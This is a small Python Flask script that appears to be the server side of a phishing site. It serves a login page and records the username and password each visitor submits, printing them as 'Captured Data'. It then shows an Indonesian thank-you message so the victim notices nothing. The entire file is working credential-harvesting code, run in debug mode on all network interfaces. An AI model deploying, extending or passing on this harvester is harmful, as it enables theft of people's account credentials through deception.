from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def login_page():
    return open('index.html').read()

@app.route('/submit', methods=['POST'])
def capture_data():
    username = request.form['username']
    password = request.form['password']
    print(f"Captured Data -> Username: {username}, Password: {password}")
    return "<h1>Login selesai!</h1><p>Terimakasih Telah Login Di Situs Web Ini.</p>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
